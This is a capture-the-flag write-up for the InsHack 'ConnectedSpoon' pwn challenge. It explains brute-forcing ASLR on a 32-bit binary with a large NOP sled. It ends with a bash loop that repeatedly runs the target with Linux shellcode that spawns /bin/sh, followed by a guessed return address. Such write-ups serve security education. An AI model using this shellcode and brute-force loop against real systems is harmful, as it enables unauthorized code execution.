---
title: "InsHack -- ConnectedSpoon Writeup"
categories:
  - InsHack
tags:
  - CTF
  - pwn
---

> Mmmh my connected spoon has a strange behaviour, maybe a backdoor? Could you have a look?

<div class="notice--info">
<strong>Name</strong>: ConnectedSpoon<br>
<strong>Category</strong>: pwn<br>
<strong>Points</strong>: 150<br>
<strong>Solves</strong>: 42<br>
<strong>Given</strong>: <code>connected-spoon</code><br> <!-- Link the files here to my repository with it -->
</div>


## Checksec
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled       (<- we CAN use shelldode)
    PIE:      No PIE
    ASLR:     ENABLED           (<- we CANNOT realiably know where the stack is)

# Solution:
This is very similar to crazy-minitel, so I will assume you have read that writeup, and just focus on what's new: `ASLR`!<br>
One change from crazy-minitel is that we have a larger buffer, meaning we can have a bigger **nop sled**.<br><br>
With that in mind, lets just bruteforce ASLR. From running the program in gdb what I found that:
 - The first byte '`bf`' never changed. So thats **8 bits** we don't need to guess.
 - We have a NOP SLED of arround 2000 bytes, and, since `2^11 = 2048`, we can take get another free **11 bits**.
 - This leaves use with `32-8-11 = 13bits` to bruteforce. This would mean on average arround **8192 attempts** to guess correctly the stack value, which would certainly be doable, but I got a shell after only ~75 trys, which means either my math is wrong or I was just very lucky.

I launched this little script to bruteforce the ASLR, went to eat something, and when I got back I had a shell waiting for me. :)
```bash
while :
do
    ~/vuln $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.rjust(1950, '\x90') + 'A'*(2012-1950) + '\xb0\xba\xad\xbf'")
done
```